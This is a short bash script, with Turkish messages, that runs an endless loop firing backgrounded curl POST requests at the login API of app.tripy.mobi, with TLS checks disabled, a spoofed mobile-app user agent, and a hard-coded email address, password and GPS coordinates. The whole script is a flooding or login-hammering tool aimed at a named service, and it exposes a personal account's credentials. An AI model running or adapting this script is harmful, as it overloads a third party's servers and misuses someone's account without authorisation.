#!/bin/bash
i=0

trap ctrl_c INT

ctrl_c() {
    echo "Program kapatıldı."
    exit 0
}

while true
do
 curl -i -s -k -X $'POST' \
    -H $'user-agent: Dart/3.1 (dart:io)' -H $'content-type: application/x-www-form-urlencoded; charset=utf-8' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Length: 89' -H $'host: app.tripy.mobi' -H $'Connection: close' \
    --data-binary $'email=ozmanbarutcu%40gmail.com&password=123r&app=Management&lat=39.7794644&lon=32.8088291' \
    $'https://app.tripy.mobi/api/auth/login-with-password?email=ozmanbarutcu%40gmail.com&password=123r&app=Management&lat=39.7794644&lon=32.8088291' &
    echo "Paket $i:"
    i=$((i+1))
done
 
